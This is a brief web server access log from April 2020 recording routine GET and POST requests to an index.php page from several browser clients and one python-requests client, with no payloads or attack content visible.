89.158.250.112 - - [22/Apr/2020:14:39:44 +0000] "GET /index.php HTTP/1.1" 200 618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
83.198.2.131 - - [22/Apr/2020:14:39:45 +0000] "GET / HTTP/1.1" 200 618 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
83.198.2.131 - - [22/Apr/2020:14:39:46 +0000] "GET / HTTP/1.1" 200 617 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
83.198.2.131 - - [22/Apr/2020:14:39:51 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
83.198.2.131 - - [22/Apr/2020:14:39:55 +0000] "POST /index.php HTTP/1.1" 200 626 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
89.158.250.112 - - [22/Apr/2020:14:39:57 +0000] "POST /index.php HTTP/1.1" 200 485 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
83.198.2.131 - - [22/Apr/2020:14:40:17 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
83.198.2.131 - - [22/Apr/2020:14:40:18 +0000] "GET /favicon.ico HTTP/1.1" 404 494 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
83.198.2.131 - - [22/Apr/2020:14:40:20 +0000] "POST /index.php HTTP/1.1" 200 627 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
89.158.250.112 - - [22/Apr/2020:14:40:25 +0000] "GET /index.php HTTP/1.1" 200 618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
83.198.2.131 - - [22/Apr/2020:14:40:26 +0000] "GET / HTTP/1.1" 200 618 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
83.198.2.131 - - [22/Apr/2020:14:40:27 +0000] "GET / HTTP/1.1" 200 617 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
90.127.241.123 - - [22/Apr/2020:14:40:30 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
89.158.250.112 - - [22/Apr/2020:14:40:30 +0000] "GET /index.php HTTP/1.1" 200 618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
88.124.221.38 - - [22/Apr/2020:14:40:32 +0000] "GET /index.php HTTP/1.1" 200 676 "-" "python-requests/2.23.0"
83.198.2.131 - - [22/Apr/2020:14:40:35 +0000] "GET / HTTP/1.1" 200 618 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
91.175.7.13 - - [22/Apr/2020:14:40:37 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"
91.175.7.13 - - [22/Apr/2020:14:40:43 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"
